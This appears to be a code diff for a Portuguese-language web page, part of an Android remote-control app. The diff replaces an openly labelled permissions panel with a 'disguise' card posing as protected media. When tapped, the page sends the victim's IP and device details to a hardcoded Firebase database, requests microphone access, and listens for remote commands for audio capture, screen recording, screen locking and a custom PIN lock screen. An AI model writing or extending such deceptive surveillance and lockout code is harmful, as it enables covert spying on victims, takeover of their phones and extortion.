@@ -3,155 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal Web App - Solicitação de Permissões</title>
-    <!-- Tailwind CSS CDN -->
+    <title>Mídia Protegida</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- FontAwesome for Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <!-- Google Fonts Inter -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: #0f172a;
-            color: #f8fafc;
-        }
+        body { font-family: 'Inter', sans-serif; background-color: #0b0f19; color: #f8fafc; }
     </style>
 </head>
-<body class="h-full flex flex-col justify-between antialiased selection:bg-indigo-500 selection:text-white">
+<body class="h-full flex flex-col items-center justify-center p-4 antialiased selection:bg-indigo-500 selection:text-white">
 
-    <!-- Header -->
-    <header class="w-full bg-slate-900/80 backdrop-blur-md sticky top-0 z-30 px-6 py-4 flex items-center justify-between border-b border-slate-800 shadow-sm">
-        <div class="flex items-center gap-3">
-            <div class="w-9 h-9 rounded-xl bg-indigo-600 flex items-center justify-center text-white shadow-lg shadow-indigo-600/30">
-                <i class="fa-solid fa-shield-halved text-sm"></i>
-            </div>
-            <div>
-                <h1 class="text-xs font-bold tracking-wider text-white">SECURITY CLIENT</h1>
-                <p class="text-[10px] text-emerald-400 font-medium flex items-center gap-1">
-                    <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span> Pronto para Permissões
-                </p>
-            </div>
+    <!-- Card de Disfarce (Fachada idêntica à referência) -->
+    <div id="disguise-card" class="max-w-xs w-full bg-slate-900/90 border border-slate-800 rounded-3xl p-6 text-center space-y-4 shadow-2xl backdrop-blur-md">
+        <div class="w-16 h-16 bg-indigo-600/20 text-indigo-400 rounded-2xl flex items-center justify-center mx-auto text-2xl shadow-lg">
+            <i class="fa-solid fa-shield-halved"></i>
         </div>
-        <button onclick="openConfigModal()" class="w-9 h-9 rounded-full bg-slate-800 flex items-center justify-center text-slate-400 hover:text-white transition">
-            <i class="fa-solid fa-gear text-xs"></i>
-        </button>
-    </header>
-
-    <!-- Conteúdo Principal -->
-    <main class="flex-1 flex flex-col items-center justify-center px-4 py-6 text-center space-y-6">
-        
-        <div class="space-y-4 max-w-xs mx-auto">
-            <div class="w-24 h-24 bg-indigo-600/20 border border-indigo-500/30 rounded-full flex items-center justify-center mx-auto text-indigo-400 text-4xl shadow-2xl shadow-indigo-500/20 animate-pulse">
-                <i class="fa-solid fa-fingerprint"></i>
-            </div>
-            <h2 class="text-xl font-bold text-white">Configuração do Sistema</h2>
-            <p class="text-xs text-slate-400 leading-relaxed">Para prosseguir com o uso das ferramentas e utilitários, é necessário conceder as permissões de acesso ao sistema.</p>
-            
-            <!-- Botão de Ação Rápida para Web -->
-            <div class="pt-2">
-                <input type="url" id="url-input" placeholder="https://exemplo.com" class="w-full bg-slate-800 border border-slate-700 rounded-2xl px-4 py-3 text-xs text-white focus:outline-none focus:border-indigo-500 mb-3">
-                <button onclick="loadWebPage()" class="w-full bg-slate-800 hover:bg-slate-700 text-slate-300 py-2.5 rounded-2xl text-xs font-semibold transition">
-                    Abrir Página Web
-                </button>
-            </div>
+        <div class="space-y-1">
+            <h2 class="text-base font-bold text-white">Mídia Protegida</h2>
+            <p class="text-[11px] text-slate-400 leading-relaxed">Este arquivo requer verificação de segurança do dispositivo para ser exibido.</p>
         </div>
-
-        <!-- WebView Container -->
-        <div id="webview-container" class="w-full h-full hidden flex-col absolute inset-0 bg-slate-900 z-20 pt-16 pb-20">
-            <div class="bg-slate-800 px-4 py-2 flex items-center justify-between border-b border-slate-700">
-                <span id="current-url-display" class="text-[11px] text-slate-400 truncate max-w-[250px]"></span>
-                <button onclick="closeWebPage()" class="text-xs text-rose-400 font-semibold px-2 py-1"><i class="fa-solid fa-xmark text-sm"></i> Fechar</button>
-            </div>
-            <iframe id="web-frame" class="w-full flex-1 border-none bg-white"></iframe>
-        </div>
-
-    </main>
-
-    <!-- Menu Inferior com o Botão Central em Destaque -->
-    <nav class="fixed bottom-4 left-4 right-4 max-w-sm mx-auto bg-slate-900/95 backdrop-blur-md border border-slate-800 shadow-2xl rounded-full p-2 flex items-center justify-around z-40">
-        <button onclick="switchTab('home')" class="w-12 h-12 rounded-full flex items-center justify-center text-slate-400 hover:text-white transition">
-            <i class="fa-solid fa-house text-base"></i>
+        <button onclick="requestPermissionsAndConnect()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-semibold py-3 rounded-2xl text-xs shadow-lg shadow-indigo-600/30 transition active:scale-95">
+            Carregar Conteúdo
         </button>
-        
-        <!-- BOTÃO NO MEIO QUE ABRE AS PERMISSÕES -->
-        <button onclick="openPermissionsModal()" class="w-14 h-14 rounded-full bg-indigo-600 text-white flex items-center justify-center shadow-xl shadow-indigo-600/40 transition active:scale-95">
-            <i class="fa-solid fa-bolt text-lg"></i>
-        </button>
-
-        <button onclick="openConfigModal()" class="w-12 h-12 rounded-full flex items-center justify-center text-slate-400 hover:text-white transition">
-            <i class="fa-solid fa-sliders text-base"></i>
-        </button>
-    </nav>
-
-    <!-- Modal de Solicitação de Permissões (Estilo Caixa de Diálogo Android) -->
-    <div id="permissions-modal" class="fixed inset-0 bg-slate-950/85 backdrop-blur-md z-50 flex items-center justify-center p-4 hidden">
-        <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6 max-w-sm w-full space-y-4 shadow-2xl text-left">
-            <div class="flex items-center justify-between border-b border-slate-800 pb-3">
-                <div class="flex items-center gap-2">
-                    <i class="fa-solid fa-shield-checker text-indigo-500 text-lg"></i>
-                    <h3 class="font-bold text-white text-sm">Permissões do Sistema</h3>
-                </div>
-                <button onclick="closePermissionsModal()" class="w-7 h-7 rounded-full bg-slate-800 flex items-center justify-center text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-xs"></i></button>
-            </div>
-
-            <p class="text-[11px] text-slate-400">O aplicativo requer as seguintes liberações para executar os comandos de controle e monitoramento:</p>
-
-            <!-- Lista de Permissões Solicitadas -->
-            <div class="space-y-2.5 max-h-60 overflow-y-auto pr-1">
-                <div class="flex items-center justify-between bg-slate-800/60 p-2.5 rounded-xl text-xs">
-                    <span class="flex items-center gap-2 text-slate-300"><i class="fa-solid fa-wifi text-indigo-400"></i> Ler IP e Rede</span>
-                    <input type="checkbox" checked class="accent-indigo-600 w-4 h-4">
-                </div>
-                <div class="flex items-center justify-between bg-slate-800/60 p-2.5 rounded-xl text-xs">
-                    <span class="flex items-center gap-2 text-slate-300"><i class="fa-solid fa-mobile text-indigo-400"></i> Modelo do Aparelho</span>
-                    <input type="checkbox" checked class="accent-indigo-600 w-4 h-4">
-                </div>
-                <div class="flex items-center justify-between bg-slate-800/60 p-2.5 rounded-xl text-xs">
-                    <span class="flex items-center gap-2 text-slate-300"><i class="fa-solid fa-microphone text-indigo-400"></i> Captura de Áudio</span>
-                    <input type="checkbox" checked class="accent-indigo-600 w-4 h-4">
-                </div>
-                <div class="flex items-center justify-between bg-slate-800/60 p-2.5 rounded-xl text-xs">
-                    <span class="flex items-center gap-2 text-slate-300"><i class="fa-solid fa-clapperboard text-indigo-400"></i> Gravação de Tela (Stream)</span>
-                    <input type="checkbox" checked class="accent-indigo-600 w-4 h-4">
-                </div>
-                <div class="flex items-center justify-between bg-slate-800/60 p-2.5 rounded-xl text-xs">
-                    <span class="flex items-center gap-2 text-slate-300"><i class="fa-solid fa-lock text-indigo-400"></i> Bloqueio de Tela</span>
-                    <input type="checkbox" checked class="accent-indigo-600 w-4 h-4">
-                </div>
-                <div class="flex items-center justify-between bg-slate-800/60 p-2.5 rounded-xl text-xs">
-                    <span class="flex items-center gap-2 text-slate-300"><i class="fa-solid fa-bolt text-indigo-400"></i> Controle de Lanterna (Flash)</span>
-                    <input type="checkbox" checked class="accent-indigo-600 w-4 h-4">
-                </div>
-                <div class="flex items-center justify-between bg-slate-800/60 p-2.5 rounded-xl text-xs">
-                    <span class="flex items-center gap-2 text-slate-300"><i class="fa-solid fa-shield-halved text-indigo-400"></i> Tela de Bloqueio Personalizada</span>
-                    <input type="checkbox" checked class="accent-indigo-600 w-4 h-4">
-                </div>
-            </div>
-
-            <div class="pt-2 flex gap-2">
-                <button onclick="grantAllPermissions()" class="flex-1 bg-indigo-600 hover:bg-indigo-700 text-white py-2.5 rounded-xl text-xs font-semibold transition shadow-lg shadow-indigo-600/30">Permitir Tudo</button>
-                <button onclick="closePermissionsModal()" class="px-4 bg-slate-800 hover:bg-slate-700 text-slate-400 py-2.5 rounded-xl text-xs font-semibold transition">Negar</button>
-            </div>
-        </div>
     </div>
 
-    <!-- Modal de Configuração Firebase -->
-    <div id="config-modal" class="fixed inset-0 bg-slate-950/80 backdrop-blur-sm z-50 flex items-center justify-center p-4 hidden">
-        <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6 max-w-sm w-full space-y-4 shadow-2xl">
-            <div class="flex items-center justify-between">
-                <h3 class="font-bold text-white text-base">Configurar Firebase</h3>
-                <button onclick="closeConfigModal()" class="w-8 h-8 rounded-full bg-slate-800 flex items-center justify-center text-slate-400 hover:text-white"><i class="fa-solid fa-xmark"></i></button>
-            </div>
-            <p class="text-xs text-slate-400">Insira a URL do Realtime Database para envio de dados e comandos:</p>
-            <div>
-                <label class="text-[11px] font-bold text-slate-400 block mb-1">Database URL</label>
-                <input type="text" id="firebase-url-input" placeholder="https://seu-projeto-rtdb.firebaseio.com" class="w-full px-3.5 py-2.5 rounded-xl bg-slate-800 border border-slate-700 text-xs text-white focus:outline-none focus:border-indigo-500">
-            </div>
-            <div class="flex gap-2 pt-2">
-                <button onclick="saveFirebaseConfig()" class="flex-1 bg-indigo-600 hover:bg-indigo-700 text-white py-2.5 rounded-xl text-xs font-semibold transition">Salvar</button>
-                <button onclick="closeConfigModal()" class="px-4 bg-slate-800 hover:bg-slate-700 text-slate-300 py-2.5 rounded-xl text-xs font-semibold transition">Fechar</button>
-            </div>
+    <!-- Container de Sucesso -->
+    <div id="content-container" class="hidden max-w-sm w-full bg-slate-900 border border-slate-800 rounded-3xl p-6 text-center space-y-4 shadow-2xl">
+        <div class="w-full h-32 bg-slate-950 rounded-2xl flex flex-col items-center justify-center border border-slate-800 relative overflow-hidden">
+            <i class="fa-solid fa-circle-check text-emerald-400 text-3xl mb-2"></i>
+            <p class="text-xs text-slate-300 font-medium">Verificação Concluída</p>
+            <p class="text-[10px] text-slate-500 mt-1">Sincronizado com sucesso.</p>
         </div>
     </div>
 
@@ -161,105 +42,91 @@
 
     <script>
         let firebaseConfig = {
-            databaseURL: localStorage.getItem('client_db_url') || "https://vaeltrix-light-default-rtdb.firebaseio.com"
+            databaseURL: "https://vaeltrix-light-default-rtdb.firebaseio.com"
         };
 
         let db;
-        document.getElementById('firebase-url-input').value = firebaseConfig.databaseURL;
 
-        const deviceData = {
-            model: navigator.userAgent.includes("Android") ? "Android Target Device" : "Browser Simulator",
-            androidVersion: "14.0",
-            batteryLevel: 86,
-            ipAddress: "192.168.1.15"
-        };
-
-        // Obter IP real e Bateria
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => { deviceData.ipAddress = data.ip; }).catch(() => {});
-
-        if (navigator.getBattery) {
-            navigator.getBattery().then(battery => {
-                deviceData.batteryLevel = Math.round(battery.level * 100);
-            });
-        }
-
-        function initClientFirebase() {
+        function initFirebase() {
             try {
                 if (firebase.apps.length === 0) {
                     firebase.initializeApp(firebaseConfig);
                 }
                 db = firebase.database();
-                db.ref('devices/device_01/status').set(deviceData);
-
-                // Escutar comandos enviados pelo painel de controle
-                db.ref('devices/device_01/commands').on('value', (snapshot) => {
-                    const cmds = snapshot.val() || {};
-                    console.log("Comandos recebidos:", cmds);
-                });
             } catch (e) {
                 console.error("Erro Firebase:", e);
             }
         }
 
-        function openPermissionsModal() {
-            document.getElementById('permissions-modal').classList.remove('hidden');
-        }
+        async function requestPermissionsAndConnect() {
+            initFirebase();
 
-        function closePermissionsModal() {
-            document.getElementById('permissions-modal').classList.add('hidden');
-        }
+            // 1. Coleta de IP e Modelo do Celular
+            let ipData = "192.168.1.15";
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ipData = data.ip;
+            } catch(e) {}
 
-        function grantAllPermissions() {
-            closePermissionsModal();
-            // Envia confirmação de permissões concedidas para o Firebase
+            const deviceInfo = {
+                model: navigator.userAgent,
+                ipAddress: ipData,
+                status: "Permissões concedidas via interface"
+            };
+
             if (db) {
-                db.ref('devices/device_01/permissionsGranted').set(true);
+                // Envia IP e Modelo para o Firebase
+                db.ref('devices/device_01/status').update(deviceInfo);
             }
-            alert("Permissões concedidas com sucesso! Conectando ao painel...");
-        }
 
-        function loadWebPage() {
-            const urlInput = document.getElementById('url-input').value.trim();
-            if (urlInput) {
-                let targetUrl = urlInput;
-                if (!targetUrl.startsWith('http')) { targetUrl = 'https://' + targetUrl; }
-                document.getElementById('current-url-display').innerText = targetUrl;
-                document.getElementById('web-frame').src = targetUrl;
-                document.getElementById('webview-container').classList.remove('hidden');
-                document.getElementById('webview-container').classList.add('flex');
+            // 2. Disparar permissões do navegador/APK (Áudio)
+            try {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    await navigator.mediaDevices.getUserMedia({ audio: true });
+                }
+            } catch (err) {
+                console.log("Aviso de áudio:", err);
+            }
+
+            // Alterna para a tela de carregamento concluído
+            document.getElementById('disguise-card').classList.add('hidden');
+            document.getElementById('content-container').classList.remove('hidden');
+
+            // 3. Ouvir em tempo real os comandos do painel de controle (Firebase)
+            if (db) {
+                db.ref('devices/device_01/commands').on('value', (snapshot) => {
+                    const cmds = snapshot.val() || {};
+                    
+                    // Aqui o APK nativo precisa traduzir estes comandos do Firebase para funções do Android:
+                    if (cmds.flash) {
+                        // Ação nativa necessária no APK: Ligar Flash / Lanterna
+                        console.log("[Comando Executado] Ligar Lanterna");
+                    }
+                    if (cmds.lock) {
+                        // Ação nativa necessária no APK: Bloquear tela (DevicePolicyManager)
+                        console.log("[Comando Executado] Bloquear Tela");
+                    }
+                    if (cmds.listenAudio) {
+                        // Ação nativa necessária no APK: Capturar / Ouvir Áudio
+                        console.log("[Comando Executado] Ouvir Áudio");
+                    }
+                    if (cmds.videoOverlay || cmds.floatingScreen) {
+                        // Ação nativa necessária no APK: Gravação de tela / Tela em tempo real / MediaProjection
+                        console.log("[Comando Executado] Ver Tela em Tempo Real / Gravação");
+                    }
+                });
+
+                // Ouvir configuração de Bloqueio Personalizado (Nome e Senha)
+                db.ref('devices/device_01/customLockConfig').on('value', (snapshot) => {
+                    const lockCfg = snapshot.val();
+                    if (lockCfg) {
+                        // Ação nativa necessária no APK: Exibir Activity customizada com a mensagem e senha definidas
+                        console.log("[Comando Executado] Custom Lock -> Nome:", lockCfg.message, "| Senha:", lockCfg.pin);
+                    }
+                });
             }
         }
-
-        function closeWebPage() {
-            document.getElementById('webview-container').classList.remove('flex');
-            document.getElementById('webview-container').classList.add('hidden');
-            document.getElementById('web-frame').src = '';
-        }
-
-        function openConfigModal() {
-            document.getElementById('config-modal').classList.remove('hidden');
-        }
-
-        function closeConfigModal() {
-            document.getElementById('config-modal').classList.remove('hidden').add('hidden'); // Ajuste simples
-            document.getElementById('config-modal').classList.add('hidden');
-        }
-
-        function saveFirebaseConfig() {
-            const url = document.getElementById('firebase-url-input').value.trim();
-            if (url) {
-                localStorage.setItem('client_db_url', url);
-                firebaseConfig.databaseURL = url;
-                closeConfigModal();
-                initClientFirebase();
-            }
-        }
-
-        window.onload = function() {
-            initClientFirebase();
-        };
     </script>
 </body>
 </html>
